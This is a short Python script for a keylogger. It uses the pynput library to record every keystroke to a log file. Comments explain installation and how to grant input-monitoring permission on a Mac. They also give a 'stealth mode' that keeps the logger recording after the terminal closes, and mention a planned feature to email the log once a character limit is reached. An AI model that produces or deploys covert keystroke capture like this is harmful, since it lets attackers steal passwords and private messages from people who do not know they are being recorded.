

# [[[[ STILL NEED TO DEFINE AN ARGUMENT THAT SENDS OUT THE FULL KEY LOG TO AN EMAIL AFTER A SPECIFIED CHARACTER LIMIT IS SET ]]]]

# REQUIREMENTS:
# [Win] - " pip install pynput "
# [Linux] - " pip3 install pynput "

# PERMISSIONS FOR MAC:
# For Windows, the program should work like a charm. But in case you are a Mac user — Go to Settings > Security & Privacy > Privacy > Input Monitoring and tick the checkbox in front of the Terminal or the IDE you are working on.



#  [DONT RUN "Keylogger" AS SUDO ]


from pynput.keyboard import Listener

def log_keystroke(key):
    key = str(key).replace("'", "")

    if key == 'Key.space':
        key = ' '
    if key == 'Key.shift_r':
        key = ''
    if key == "Key.enter":
        key = '\n'
    if key == "Key.backspace":
        key = '-'
    if key == "Key.shift":
        key = '*'

    with open("log.txt", 'a') as f:
        f.write(key)

with Listener(on_press=log_keystroke) as l:
    l.join()

# How to run Script in Stealth Mode: ( This will let the code run even after the terminal closes while still recording the keystrokes )
# [Win] - " Rename file extension from .py to .pyw "
# [Linux] - " nohup python3 key.py & "

